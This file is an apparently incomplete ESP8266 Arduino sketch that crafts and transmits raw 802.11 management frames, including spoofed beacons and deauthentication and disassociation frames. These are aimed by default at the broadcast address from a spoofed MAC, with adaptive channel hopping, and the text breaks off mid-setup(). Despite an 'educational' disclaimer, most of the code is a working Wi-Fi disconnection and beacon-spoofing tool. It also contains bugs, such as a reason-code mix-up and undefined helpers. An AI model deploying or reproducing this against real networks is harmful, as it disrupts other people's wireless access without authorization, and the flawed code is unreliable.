#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <user_interface.h>

// ESP8266 SDK function declarations
extern "C" {
    void ets_delay_us(uint32_t us);
    void system_soft_wdt_feed(void);
    // os_random is already declared in osapi.h
    
    #ifndef ICACHE_RAM_ATTR
    #define ICACHE_RAM_ATTR __attribute__((section(".iram.text")))
    #endif
}

#include "ieee80211_structs.h"
#include "sequence_handler.h"

// Frame type selection
enum FrameType {
    FRAME_ASSOC_REQ = 0,
    FRAME_BEACON,
    FRAME_DEAUTH,
    FRAME_DISASSOC
};

// Forward declarations
ICACHE_RAM_ATTR bool send_frame_safe(FrameType frame_type);
ICACHE_RAM_ATTR uint16_t build_frame_safe(uint8_t* buffer, uint16_t buffer_size,
                                         const uint8_t* dst, const uint8_t* src,
                                         const uint8_t* bssid, uint8_t type,
                                         uint8_t subtype);
uint16_t build_beacon_packet(uint8_t* buffer, const uint8_t* src_addr, const char* ssid, uint8_t channel);
uint16_t build_deauth_packet(uint8_t* buffer, const uint8_t* dst_addr, const uint8_t* src_addr, const uint8_t* bssid, uint16_t reason);
uint16_t build_disassoc_packet(uint8_t* buffer, const uint8_t* dst_addr, const uint8_t* src_addr, const uint8_t* bssid, uint16_t reason);
bool perform_channel_hop(uint8_t& channel);

/**
 * ESP8266 Raw 802.11 Management Frame Transmission
 * 
 * This sketch demonstrates crafting and transmitting raw IEEE 802.11 management frames using 
 * ESP8266's low-level WiFi capabilities. Implements:
 * - Association Request frames
 * - Beacon frames
 * - Deauthentication frames
 * - Disassociation frames
 * 
 * WARNING: This code bypasses normal WiFi protocols and should ONLY be used for:
 * - Educational purposes
 * - Network security research
 * - Protocol analysis
 * 
 * IMPORTANT: Transmitting unauthorized packets may violate regulations in your region.
 * Always ensure compliance with local laws and regulations.
 */

// Atomic sequence number handling


// Memory-aligned buffers for packet construction with increased size for safety
ICACHE_RAM_ATTR static uint8_t __attribute__((aligned(4))) aligned_beacon_buffer[1024];
ICACHE_RAM_ATTR static uint8_t __attribute__((aligned(4))) aligned_deauth_buffer[1024];
ICACHE_RAM_ATTR static uint8_t __attribute__((aligned(4))) aligned_disassoc_buffer[1024];
ICACHE_RAM_ATTR static uint8_t __attribute__((aligned(4))) aligned_packet_buffer[1024];

// Global MAC addresses and channel with proper alignment
static uint8_t wifi_channel __attribute__((aligned(4))) = 1;
static uint8_t target_mac[6] __attribute__((aligned(4))) = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static uint8_t source_mac[6] __attribute__((aligned(4))) = {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC};

// Default SSID and channel
char ssid[33] = "TestNetwork";

// Frame type selection
FrameType selected_frame = FRAME_ASSOC_REQ;

// Reason code for deauth/disassoc
uint16_t reason_code = 0x0001;

/**
 * Safe packet construction and transmission
 */
ICACHE_RAM_ATTR bool send_frame_safe(FrameType frame_type) {
    uint16_t packet_size = 0;
    uint8_t* tx_buffer = NULL;
    // Only critical section for sequence number and buffer write
    noInterrupts();
    switch (frame_type) {
        case FRAME_ASSOC_REQ:
            packet_size = build_frame_safe(aligned_packet_buffer, sizeof(aligned_packet_buffer), target_mac, source_mac, target_mac, 0, 0);
            tx_buffer = aligned_packet_buffer;
            break;
        case FRAME_BEACON:
            packet_size = build_frame_safe(aligned_beacon_buffer, sizeof(aligned_beacon_buffer), (uint8_t*)"\xff\xff\xff\xff\xff\xff", source_mac, source_mac, 0, 8);
            tx_buffer = aligned_beacon_buffer;
            break;
        case FRAME_DEAUTH:
            packet_size = build_frame_safe(aligned_deauth_buffer, sizeof(aligned_deauth_buffer), target_mac, source_mac, target_mac, 0, 12);
            tx_buffer = aligned_deauth_buffer;
            break;
        case FRAME_DISASSOC:
            packet_size = build_frame_safe(aligned_disassoc_buffer, sizeof(aligned_disassoc_buffer), target_mac, source_mac, target_mac, 0, 10);
            tx_buffer = aligned_disassoc_buffer;
            break;
    }
    interrupts();
    if (!packet_size) {
        return false;
    }
    // Add frame body (not critical section)
    switch (frame_type) {
        case FRAME_ASSOC_REQ:
            packet_size = complete_association_request(aligned_packet_buffer, packet_size, sizeof(aligned_packet_buffer));
            break;
        case FRAME_BEACON:
            packet_size = complete_beacon_frame(aligned_beacon_buffer, packet_size, sizeof(aligned_beacon_buffer));
            break;
        case FRAME_DEAUTH:
            packet_size = complete_deauth_frame(aligned_deauth_buffer, packet_size, sizeof(aligned_deauth_buffer));
            break;
        case FRAME_DISASSOC:
            packet_size = complete_disassoc_frame(aligned_disassoc_buffer, packet_size, sizeof(aligned_disassoc_buffer));
            break;
    }
    return safe_transmit_packet(tx_buffer, packet_size, 2, wifi_channel);
}

// Helper functions to complete frame bodies
ICACHE_RAM_ATTR uint16_t complete_association_request(uint8_t* buffer, uint16_t pos, uint16_t buffer_size) {
    // Check if there's enough space for fixed parameters
    if (pos + sizeof(assoc_fixed_params_t) > buffer_size) return pos; // Not enough space

    // Capability Info (2 bytes)
    buffer[pos++] = 0x11; buffer[pos++] = 0x00;  // ESS + Privacy
    
    // Listen Interval (2 bytes)
    buffer[pos++] = 0x0A; buffer[pos++] = 0x00;
    
    // SSID
    uint8_t ssid_len = strlen(ssid);
    // Check if there's enough space for SSID element header (ID + Length) and data
    if (pos + 2 + ssid_len > buffer_size) return pos; // Not enough space
    buffer[pos++] = 0x00;  // Element ID
    buffer[pos++] = ssid_len;  // Length
    memcpy(buffer + pos, ssid, ssid_len);
    pos += ssid_len;
    
    // Add supported rates
    pos = add_supported_rates(buffer, pos, sizeof(aligned_packet_buffer));
    if (pos > sizeof(aligned_packet_buffer)) return sizeof(aligned_packet_buffer); // Propagate overflow
    
    // Extended Supported Rates - OPTIONAL but recommended
    // Check if there's enough space for Extended Supported Rates element header (ID + Length) and data (4 bytes)
    if (pos + 2 + 4 > sizeof(aligned_packet_buffer)) return sizeof(aligned_packet_buffer); // Not enough space
    buffer[pos++] = 0x32;  // Element ID: Extended Supported Rates
    buffer[pos++] = 0x04;  // Length
    buffer[pos++] = 0x30;  // 24 Mbps
    buffer[pos++] = 0x48;  // 36 Mbps
    buffer[pos++] = 0x60;  // 48 Mbps
    buffer[pos++] = 0x6C;  // 54 Mbps
    
    // HT Capabilities - OPTIONAL, for 802.11n
    // Check if there's enough space for HT Capabilities element header (ID + Length) and data (26 bytes)
    if (pos + 2 + 26 > sizeof(aligned_packet_buffer)) return sizeof(aligned_packet_buffer); // Not enough space
    buffer[pos++] = 0x2D;  // Element ID: HT Capabilities
    buffer[pos++] = 0x1A;  // Length: 26 bytes
    buffer[pos++] = 0x01; buffer[pos++] = 0x00;  // HT Capabilities Info
    buffer[pos++] = 0x00;  // A-MPDU Parameters
    // Supported MCS Set (16 bytes)
    buffer[pos++] = 0xFF; buffer[pos++] = 0xFF; // MCS 0-15 supported
    buffer[pos++] = 0x00; buffer[pos++] = 0x00;
    buffer[pos++] = 0x00; buffer[pos++] = 0x00;
    buffer[pos++] = 0x00; buffer[pos++] = 0x00;
    buffer[pos++] = 0x00; buffer[pos++] = 0x00;
    buffer[pos++] = 0x00; buffer[pos++] = 0x00;
    // HT Extended Capabilities
    buffer[pos++] = 0x00; buffer[pos++] = 0x00;
    // Transmit Beamforming Capabilities
    buffer[pos++] = 0x00; buffer[pos++] = 0x00; buffer[pos++] = 0x00; buffer[pos++] = 0x00;
    // ASEL Capabilities
    buffer[pos++] = 0x00;
    
    // Power Capability - OPTIONAL but helps
    // Check if there's enough space for Power Capability element header (ID + Length) and data (2 bytes)
    if (pos + 2 + 2 > sizeof(aligned_packet_buffer)) return sizeof(aligned_packet_buffer); // Not enough space
    buffer[pos++] = 0x21;  // Element ID: Power Capability
    buffer[pos++] = 0x02;  // Length
    buffer[pos++] = 0x00;  // Minimum Transmit Power Capability
    buffer[pos++] = 0x64;  // Maximum Transmit Power Capability (100 dBm)
    
    // Supported Channels - OPTIONAL but helps
    // Check if there's enough space for Supported Channels element header (ID + Length) and data (2 bytes)
    if (pos + 2 + 2 > sizeof(aligned_packet_buffer)) return sizeof(aligned_packet_buffer); // Not enough space
    buffer[pos++] = 0x24;  // Element ID: Supported Channels
    buffer[pos++] = 0x02;  // Length
    buffer[pos++] = 0x01;  // First Channel (1)
    buffer[pos++] = 0x0B;  // Number of Channels (11)

    // DS Parameter Set - CRITICAL for channel setting
    pos = add_ds_param(buffer, pos, sizeof(aligned_packet_buffer), wifi_channel);
    if (pos > sizeof(aligned_packet_buffer)) return sizeof(aligned_packet_buffer); // Propagate overflow

    // Note: FCS (4 bytes) is calculated and appended by hardware
    
    return pos;  // Return length excluding FCS
}

ICACHE_RAM_ATTR uint16_t complete_beacon_frame(uint8_t* buffer, uint16_t pos, uint16_t buffer_size) {
    // Check if there's enough space for Timestamp (8 bytes)
    if (pos + 8 > buffer_size) return pos; // Not enough space
    // Timestamp (8 bytes)
    memset(buffer + pos, 0, 8);
    pos += 8;
    
    // Check if there's enough space for Beacon interval (2 bytes)
    if (pos + 2 > buffer_size) return pos; // Not enough space
    // Beacon interval
    buffer[pos++] = 0x64; buffer[pos++] = 0x00;
    
    // Check if there's enough space for Capability info (2 bytes)
    if (pos + 2 > buffer_size) return pos; // Not enough space
    // Capability info
    buffer[pos++] = 0x31; buffer[pos++] = 0x04;
    
    // Add SSID and rates with boundary checks
    pos = add_ssid_element(buffer, pos, buffer_size);
    if (pos > buffer_size) return buffer_size; // Propagate overflow
    pos = add_supported_rates(buffer, pos, buffer_size);
    if (pos > buffer_size) return buffer_size; // Propagate overflow
    pos = add_ds_param(buffer, pos, buffer_size, wifi_channel);
    if (pos > buffer_size) return buffer_size; // Propagate overflow
    
    return pos;
}

ICACHE_RAM_ATTR uint16_t complete_deauth_frame(uint8_t* buffer, uint16_t pos, uint16_t buffer_size) {
    // Check if there's enough space for Reason code (2 bytes)
    if (pos + 2 > buffer_size) return pos; // Not enough space
    // Reason code
    buffer[pos++] = reason_code & 0xFF;
    buffer[pos++] = (reason_code >> 8) & 0xFF;
    return pos;
}

ICACHE_RAM_ATTR uint16_t complete_disassoc_frame(uint8_t* buffer, uint16_t pos, uint16_t buffer_size) {
    // Check if there's enough space for Reason code (2 bytes)
    if (pos + 2 > buffer_size) return pos; // Not enough space
    // Reason code
    buffer[pos++] = reason_code & 0xFF;
    buffer[pos++] = (reason_code >> 8) & 0xFF;
    return pos;
}

// Common elements
ICACHE_RAM_ATTR uint16_t add_supported_rates(uint8_t* buffer, uint16_t pos, uint16_t buffer_size) {
    // Check if there's enough space for Supported Rates element header (ID + Length) and data
    if (pos + 2 + 8 > buffer_size) return buffer_size; // Not enough space
    buffer[pos++] = 0x01; // Element ID: Supported Rates
    buffer[pos++] = 0x08; // Length
    buffer[pos++] = 0x82; buffer[pos++] = 0x84;
    buffer[pos++] = 0x8B; buffer[pos++] = 0x96;
    buffer[pos++] = 0x0C; buffer[pos++] = 0x12;
    buffer[pos++] = 0x18; buffer[pos++] = 0x24;
    return pos;
}

ICACHE_RAM_ATTR uint16_t add_ssid_element(uint8_t* buffer, uint16_t pos, uint16_t buffer_size) {
    uint8_t ssid_len = strlen(ssid);
    // Check if there's enough space for SSID element header (ID + Length) and data
    if (pos + 2 + ssid_len > buffer_size) return buffer_size; // Not enough space
    buffer[pos++] = 0x00; // Element ID: SSID
    buffer[pos++] = ssid_len;
    memcpy(buffer + pos, ssid, ssid_len);
    return pos + ssid_len;
}

ICACHE_RAM_ATTR uint16_t add_ds_param(uint8_t* buffer, uint16_t pos, uint16_t buffer_size, uint8_t channel) {
    // Check if there's enough space for DS Parameter Set element header (ID + Length) and data
    if (pos + 2 + 1 > buffer_size) return buffer_size; // Not enough space
    buffer[pos++] = 0x03; // Element ID: DS Parameter Set
    buffer[pos++] = 0x01; // Length
    buffer[pos++] = channel;
    return pos;
}

// Global variables
uint8_t channel_scan = 1;

// Debug flag
bool debug_mode = true;

// Channel hopping configuration
#define MIN_CHANNEL 1
#define MAX_CHANNEL 14
#define DWELL_TIME 50  // ms per channel
#define CHANNEL_SWITCH_DELAY 5  // ms

// Channel statistics for adaptive hopping
struct ChannelStats {
    uint32_t last_success;    // Timestamp of last successful transmission
    uint8_t fail_count;       // Consecutive failures
    uint8_t busy_count;       // Times channel was found busy
    bool blacklisted;         // Temporary blacklist flag
} channel_stats[MAX_CHANNEL + 1];

// Channel selection strategy
enum HoppingStrategy {
    SEQUENTIAL,      // Simple 1->14 sequence
    ADAPTIVE,        // Based on success rate
    RANDOM          // Random channel selection
} hopping_strategy = ADAPTIVE;

/**
 * System state verification and recovery
 */
struct SystemState {
    bool hardware_ready;
    bool in_critical_section;
    uint32_t last_watchdog_feed;
    uint32_t last_successful_tx;
    uint8_t consecutive_failures;
    uint8_t recovery_attempts;
} system_state = {0};

/**
 * Interpret transmission status codes
 */
const char* get_tx_status_string(int status) {
  switch(status) {
    case 0: return "Success";
    case 1: return "Error: Invalid packet structure";
    case 2: return "Error: Wrong channel";
    case 3: return "Error: Hardware not ready";
    case 4: return "Error: Transmission timeout";
    default: return "Unknown error";
  }
}

/**
 * Check if hardware is ready for transmission
 */
bool check_hardware_ready() {
  uint32_t status = READ_PERI_REG(0x60000914);
  return (status & 0x00000001) == 0;
}

/**
 * Parse MAC address from string format (XX:XX:XX:XX:XX:XX)
 */
bool parse_mac_address(const char* mac_str, uint8_t* mac_bytes) {
  uint8_t values[6];
  int items = sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                     &values[0], &values[1], &values[2],
                     &values[3], &values[4], &values[5]);
  
  if (items == 6) {
    memcpy(mac_bytes, values, 6);
    return true;
  }
  return false;
}

/**
 * Safe packet transmission with error handling
 */
ICACHE_RAM_ATTR bool safe_transmit_packet(const uint8_t* packet, uint16_t length, uint8_t rate, uint8_t channel) {
    // Verify input parameters
    if (!packet || length == 0 || length > 1500) {
        return false;
    }

    // Verify 4-byte alignment of packet buffer
    if ((uintptr_t)packet & 0x3) {
        // Buffer is not 4-byte aligned
        return false;
    }

    // Feed watchdog before operation
    system_soft_wdt_feed();
    
    // Save current state
    uint8_t old_op_mode = wifi_get_opmode();
    bool success = false;
    
    // Critical section
    noInterrupts();
    
    // Watchdog handling
    system_soft_wdt_feed();

    // Memory barrier to ensure proper ordering
    __asm__ __volatile__ ("" ::: "memory");
    
    // Set mode and channel
    if (wifi_set_opmode(STATION_MODE)) {
        if (wifi_set_channel(channel)) {
            os_delay_us(1000);  // Wait for channel switch
            
            // Attempt transmission directly from the aligned input buffer
            success = wifi_send_pkt_freedom((uint8_t*)packet, length, false) == 0;
        }
    }
    
    // Memory barrier after transmission
    __asm__ __volatile__ ("" ::: "memory");
    
    // Restore state
    wifi_set_opmode(old_op_mode);
    interrupts();
    
    return success;
}

/**
 * Safe frame building with error checking
 */
ICACHE_RAM_ATTR uint16_t build_frame_safe(uint8_t* buffer, uint16_t buffer_size, 
                                        const uint8_t* dst, const uint8_t* src, 
                                        const uint8_t* bssid, uint8_t type, 
                                        uint8_t subtype) {
    if (!buffer || buffer_size < sizeof(ieee80211_mac_header_t)) {
        return 0;
    }
    
    // Verify buffer alignment
    if ((uintptr_t)buffer & 0x3) {
        return 0;  // Buffer must be 4-byte aligned
    }
    
    memset(buffer, 0, buffer_size);
    uint16_t pos = 0;
    
    // Use a temporary aligned header structure
    ieee80211_mac_header_t __attribute__((aligned(4))) header_tmp = {0};
    
    // Build MAC header in the temporary structure
    header_tmp.frame_ctrl.protocol_version = 0;
    header_tmp.frame_ctrl.type = type;
    header_tmp.frame_ctrl.subtype = subtype;
    header_tmp.frame_ctrl.to_ds = 0;
    header_tmp.frame_ctrl.from_ds = 0;
    header_tmp.frame_ctrl.more_frag = 0;
    header_tmp.frame_ctrl.retry = 0;
    header_tmp.frame_ctrl.power_mgmt = 0;
    header_tmp.frame_ctrl.more_data = 0;
    header_tmp.frame_ctrl.protected_frame = 0;
    header_tmp.frame_ctrl.order = 0;
    header_tmp.duration_id = 0; // Initialize duration_id
    
    // Copy addresses to the temporary structure
    if (dst) memcpy(header_tmp.addr1, dst, 6);
    if (src) memcpy(header_tmp.addr2, src, 6);
    if (bssid) memcpy(header_tmp.addr3, bssid, 6);
    
    // Get sequence number atomically and set in temporary structure
    header_tmp.seq_ctrl = get_next_sequence_atomic() << 4;
    
    // Copy the aligned temporary header to the output buffer
    memcpy(buffer, &header_tmp, sizeof(ieee80211_mac_header_t));
    pos += sizeof(ieee80211_mac_header_t);
    
    // Ensure pos is 4-byte aligned before adding fixed parameters
    // The MAC header size should be a multiple of 4 for 802.11, but let's be safe.
    while (pos % 4 != 0) {
        buffer[pos++] = 0; // Pad with zeros if necessary
    }
    
    return pos;
}

/**
 * Update frame sequence number safely
 */
ICACHE_RAM_ATTR void update_frame_sequence(ieee80211_mac_header_t* header) {
    if (header) {
        header->seq_ctrl = get_next_sequence_atomic() << 4;
    }
}

// Replace existing transmit_raw_packet with safe version
#define transmit_raw_packet safe_transmit_packet

/**
 * Builds an 802.11 Association Request packet that conforms precisely to IEEE standards
 * @param buffer The buffer to store the packet
 * @param dst_addr Destination MAC address (AP)
 * @param src_addr Source MAC address (Station)
 * @param ssid The SSID to associate with
 * @param channel The WiFi channel to operate on
 * @return The size of the generated packet
 */
uint16_t build_association_packet(uint8_t* buffer, const uint8_t* dst_addr, 
                                 const uint8_t* src_addr, const char* ssid, uint8_t channel) {
  memset(buffer, 0, sizeof(aligned_packet_buffer));  // Clear buffer with correct size
  uint16_t pos = 0;
  
  // ----- MAC Header -----
  ieee80211_mac_header_t* header = (ieee80211_mac_header_t*)buffer;
  
  // Frame Control Field - Must be exactly as per 802.11 standard for Association Request
  header->frame_ctrl.protocol_version = 0;
  header->frame_ctrl.type = 0;  // Management frame
  header->frame_ctrl.subtype = 0;  // Association Request
  header->frame_ctrl.to_ds = 0;
  header->frame_ctrl.from_ds = 0;
  header->frame_ctrl.more_frag = 0;
  header->frame_ctrl.retry = 0;
  header->frame_ctrl.power_mgmt = 0;
  header->frame_ctrl.more_data = 0;
  header->frame_ctrl.protected_frame = 0;
  header->frame_ctrl.order = 0;
  
  // Duration ID
  header->duration_id = 0;  // In little-endian byte order
  
  // Addresses
  memcpy(header->addr1, dst_addr, 6);  // Destination/AP MAC (BSSID)
  memcpy(header->addr2, src_addr, 6);  // Source/Station MAC
  memcpy(header->addr3, dst_addr, 6);  // BSSID (same as destination for Association)
  
  // Sequence Control - Use atomic accessor for each new frame
  header->seq_ctrl = get_next_sequence_atomic() << 4;  // Upper 12 bits are sequence number, lower 4 are fragment number
  
  pos += sizeof(ieee80211_mac_header_t);
  
  // Ensure pos is 4-byte aligned before adding fixed parameters
  // The MAC header size should be a multiple of 4 for 802.11, but let's be safe.
  while (pos % 4 != 0) {
      buffer[pos++] = 0; // Pad with zeros if necessary
  }
  
  // ----- Frame Body -----
  
  // Fixed Parameters
  // Use a temporary aligned fixed parameters structure
  assoc_fixed_params_t __attribute__((aligned(4))) fixed_params_tmp = {0};
  
  // Capability Information - Little endian byte order
  fixed_params_tmp.capability_info = 0x0011;  // ESS (bit 0) + Privacy (bit 4)
  
  // Listen Interval - Little endian byte order
  fixed_params_tmp.listen_interval = 0x000A;  // 10 beacon intervals
  
  // Copy the aligned temporary fixed parameters to the output buffer
  // Check if there's enough space for fixed parameters
  if (pos + sizeof(assoc_fixed_params_t) > sizeof(aligned_packet_buffer)) return sizeof(aligned_packet_buffer); // Not enough space
  memcpy(buffer + pos, &fixed_params_tmp, sizeof(assoc_fixed_params_t));
  pos += sizeof(assoc_fixed_params_t);
  
  // ----- Tagged Parameters (Information Elements) -----
  
  // SSID Parameter - MANDATORY
  uint8_t ssid_len = strlen(ssid);
  // Check if there's enough space for SSID element header (ID + Length) and data
  if (pos + 2 + ssid_len > sizeof(aligned_packet_buffer)) return sizeof(aligned_packet_buffer); // Not enough space
  buffer[pos++] = 0x00;  // Element ID: SSID
  buffer[pos++] = ssid_len;  // Length
  memcpy(buffer + pos, ssid, ssid_len);
  pos += ssid_len;
  
  // Supported Rates - MANDATORY
  pos = add_supported_rates(buffer, pos, sizeof(aligned_packet_buffer));
  if (pos > sizeof(aligned_packet_buffer)) return sizeof(aligned_packet_buffer); // Propagate overflow
  
  // Extended Supported Rates - OPTIONAL but recommended
  // Check if there's enough space for Extended Supported Rates element header (ID + Length) and data (4 bytes)
  if (pos + 2 + 4 > sizeof(aligned_packet_buffer)) return sizeof(aligned_packet_buffer); // Not enough space
  buffer[pos++] = 0x32;  // Element ID: Extended Supported Rates
  buffer[pos++] = 0x04;  // Length
  buffer[pos++] = 0x30;  // 24 Mbps
  buffer[pos++] = 0x48;  // 36 Mbps
  buffer[pos++] = 0x60;  // 48 Mbps
  buffer[pos++] = 0x6C;  // 54 Mbps
  
  // HT Capabilities - OPTIONAL, for 802.11n
  // Check if there's enough space for HT Capabilities element header (ID + Length) and data (26 bytes)
  if (pos + 2 + 26 > sizeof(aligned_packet_buffer)) return sizeof(aligned_packet_buffer); // Not enough space
  buffer[pos++] = 0x2D;  // Element ID: HT Capabilities
  buffer[pos++] = 0x1A;  // Length: 26 bytes
  buffer[pos++] = 0x01; buffer[pos++] = 0x00;  // HT Capabilities Info
  buffer[pos++] = 0x00;  // A-MPDU Parameters
  // Supported MCS Set (16 bytes)
  buffer[pos++] = 0xFF; buffer[pos++] = 0xFF; // MCS 0-15 supported
  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  // HT Extended Capabilities
  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  // Transmit Beamforming Capabilities
  buffer[pos++] = 0x00; buffer[pos++] = 0x00; buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  // ASEL Capabilities
  buffer[pos++] = 0x00;
  
  // Power Capability - OPTIONAL but helps
  // Check if there's enough space for Power Capability element header (ID + Length) and data (2 bytes)
  if (pos + 2 + 2 > sizeof(aligned_packet_buffer)) return sizeof(aligned_packet_buffer); // Not enough space
  buffer[pos++] = 0x21;  // Element ID: Power Capability
  buffer[pos++] = 0x02;  // Length
  buffer[pos++] = 0x00;  // Minimum Transmit Power Capability
  buffer[pos++] = 0x64;  // Maximum Transmit Power Capability (100 dBm)
  
  // Supported Channels - OPTIONAL but helps
  // Check if there's enough space for Supported Channels element header (ID + Length) and data (2 bytes)
  if (pos + 2 + 2 > sizeof(aligned_packet_buffer)) return sizeof(aligned_packet_buffer); // Not enough space
  buffer[pos++] = 0x24;  // Element ID: Supported Channels
  buffer[pos++] = 0x02;  // Length
  buffer[pos++] = 0x01;  // First Channel (1)
  buffer[pos++] = 0x0B;  // Number of Channels (11)

  // DS Parameter Set - CRITICAL for channel setting
  pos = add_ds_param(buffer, pos, sizeof(aligned_packet_buffer), channel);
  if (pos > sizeof(aligned_packet_buffer)) return sizeof(aligned_packet_buffer); // Propagate overflow

  // Note: FCS (4 bytes) is calculated and appended by hardware
  
  return pos;  // Return length excluding FCS
}

/**
 * Build an 802.11 Beacon frame
 */
uint16_t build_beacon_packet(uint8_t* buffer, const uint8_t* src_addr, const char* ssid, uint8_t channel) {
    memset(buffer, 0, sizeof(aligned_beacon_buffer));
    uint16_t pos = 0;

    // Build the MAC header
    pos = build_frame_safe(buffer, sizeof(aligned_beacon_buffer), (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", src_addr, src_addr, 0, 8);
    if (!pos) return 0;

    // Beacon frame body
    // Timestamp (8 bytes)
    // Check if there's enough space for Timestamp
    if (pos + 8 > sizeof(aligned_beacon_buffer)) return sizeof(aligned_beacon_buffer); // Not enough space
    memset(buffer + pos, 0, 8);
    pos += 8;

    // Beacon interval (2 bytes)
    // Check if there's enough space for Beacon interval
    if (pos + 2 > sizeof(aligned_beacon_buffer)) return sizeof(aligned_beacon_buffer); // Not enough space
    buffer[pos++] = 0x64;  // 100 TU (102.4 ms)
    buffer[pos++] = 0x00;

    // Capability info (2 bytes)
    // Check if there's enough space for Capability info
    if (pos + 2 > sizeof(aligned_beacon_buffer)) return sizeof(aligned_beacon_buffer); // Not enough space
    buffer[pos++] = 0x31;  // ESS + Privacy
    buffer[pos++] = 0x04;

    // SSID element
    pos = add_ssid_element(buffer, pos, sizeof(aligned_beacon_buffer));
    if (pos > sizeof(aligned_beacon_buffer)) return sizeof(aligned_beacon_buffer); // Propagate overflow
    
    // Supported rates
    pos = add_supported_rates(buffer, pos, sizeof(aligned_beacon_buffer));
    if (pos > sizeof(aligned_beacon_buffer)) return sizeof(aligned_beacon_buffer); // Propagate overflow
    
    // DS Parameter set
    pos = add_ds_param(buffer, pos, sizeof(aligned_beacon_buffer), channel);
    if (pos > sizeof(aligned_beacon_buffer)) return sizeof(aligned_beacon_buffer); // Propagate overflow

    return pos;
}

/**
 * Build an 802.11 Deauthentication frame
 */
uint16_t build_deauth_packet(uint8_t* buffer, const uint8_t* dst_addr, const uint8_t* src_addr, const uint8_t* bssid, uint16_t reason) {
    memset(buffer, 0, sizeof(aligned_deauth_buffer));
    uint16_t pos = 0;

    // Build the MAC header
    pos = build_frame_safe(buffer, sizeof(aligned_deauth_buffer), dst_addr, src_addr, bssid, 0, 12);
    if (!pos) return 0;

    // Add reason code
    // Check if there's enough space for Reason code (2 bytes)
    if (pos + 2 > sizeof(aligned_deauth_buffer)) return sizeof(aligned_deauth_buffer); // Not enough space
    buffer[pos++] = reason & 0xFF;
    buffer[pos++] = (reason >> 8) & 0xFF;

    return pos;
}

/**
 * Build an 802.11 Disassociation frame
 */
uint16_t build_disassoc_packet(uint8_t* buffer, const uint8_t* dst_addr, const uint8_t* src_addr, const uint8_t* bssid, uint16_t reason) {
    memset(buffer, 0, sizeof(aligned_disassoc_buffer));
    uint16_t pos = 0;

    // Build the MAC header
    pos = build_frame_safe(buffer, sizeof(aligned_disassoc_buffer), dst_addr, src_addr, bssid, 0, 10);
    if (!pos) return 0;

    // Add reason code
    // Check if there's enough space for Reason code (2 bytes)
    if (pos + 2 > sizeof(aligned_disassoc_buffer)) return sizeof(aligned_disassoc_buffer); // Not enough space
    buffer[pos++] = reason & 0xFF;
    buffer[pos++] = (reason_code >> 8) & 0xFF;

    return pos;
}

void print_packet_details(const uint8_t* buffer, uint16_t size) {
    if (!buffer || size < sizeof(ieee80211_mac_header_t)) {
        Serial.println("Invalid packet buffer");
        return;
    }

    const ieee80211_mac_header_t* header = (ieee80211_mac_header_t*)buffer;
    
    Serial.println("\n=== Packet Details ===");
    Serial.printf("Frame Control: Type=%d, Subtype=%d\n", 
                 header->frame_ctrl.type,
                 header->frame_ctrl.subtype);
    
    Serial.printf("Addr1 (Dst): %02X:%02X:%02X:%02X:%02X:%02X\n",
                 header->addr1[0], header->addr1[1], header->addr1[2],
                 header->addr1[3], header->addr1[4], header->addr1[5]);
                 
    Serial.printf("Addr2 (Src): %02X:%02X:%02X:%02X:%02X:%02X\n",
                 header->addr2[0], header->addr2[1], header->addr2[2],
                 header->addr2[3], header->addr2[4], header->addr2[5]);
                 
    Serial.printf("Addr3 (BSSID): %02X:%02X:%02X:%02X:%02X:%02X\n",
                 header->addr3[0], header->addr3[1], header->addr3[2],
                 header->addr3[3], header->addr3[4], header->addr3[5]);
                 
    Serial.printf("Sequence Num: %d\n", header->seq_ctrl >> 4);
    Serial.printf("Total Size: %d bytes\n", size);
    Serial.println("===================");
}

void setup() {
  // Initialize serial for debugging
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n\nESP8266 Raw 802.11 Management Frame Transmitter");
  Serial.println("This sketch crafts and transmits raw 802.11 management frames");
  Serial.println("==================================================================");

  // Initialize channel statistics
  initialize_channel_stats();

  // Configure ESP8266 as a station
  wifi_set_opmode(STATION_MODE);

  // Disable automatic connections
  wifi_station_disconnect();
  wifi_station_set_auto_connect(0);

  // Set MAC address if necessary
  wifi_set_macaddr(STATION_IF, source_mac);

  // Initialize WiFi channel
  wifi_channel = 1;  // Start on channel 1

  // Build initial packet for selected frame type
  uint16_t packet_size = 0;
  switch (selected_frame) {
    case FRAME_ASSOC_REQ:
      packet_size = build_association_packet(aligned_packet_buffer, target_mac, source_mac, ssid, wifi_channel);
      break;
    case FRAME_BEACON:
      packet_size = build_beacon_packet(aligned_beacon_buffer, source_mac, ssid, wifi_channel);
      break;
    case FRAME_DEAUTH:
      packet_size = build_deauth_packet(aligned_deauth_buffer, target_mac, source_mac, target_mac, reason_code);
      break;
    case FRAME_DISASSOC:
      packet_size = build_disassoc_packet(aligned_disassoc_buffer, target_mac, source_mac, target_mac, reason_code);
      break;
    default:
      packet_size = build_association_packet(aligned_packet_buffer, target_mac, source_mac, ssid, wifi_channel);
      break;
  }

  Serial.printf("Initial frame type: %d, packet size: %d bytes\n", selected_frame, packet_size);

  if (debug_mode) {
    Serial.println("Packet hex dump:");
    uint8_t* dbg_buf = aligned_packet_buffer;
    if (selected_frame == FRAME_BEACON) dbg_buf = aligned_beacon_buffer;
    else if (selected_frame == FRAME_DEAUTH) dbg_buf = aligned_deauth_buffer;
    else if (selected_frame == FRAME_DISASSOC) dbg_buf = aligned_disassoc_buffer;
    for (int i = 0; i < packet_size; i++) {
      if (i % 16 == 0) Serial.printf("\n%04X: ", i);
      Serial.printf("%02X ", dbg_buf[i]);
    }
    Serial.println("\n");
    print_packet_details(dbg_buf, packet_size);
  }

  delay(2000);  // Wait 2 seconds before transmitting

  Serial.println("Transmitting initial frame...");
  bool tx_result = false;
  uint8_t* tx_buf = aligned_packet_buffer;
  if (selected_frame == FRAME_BEACON) tx_buf = aligned_beacon_buffer;
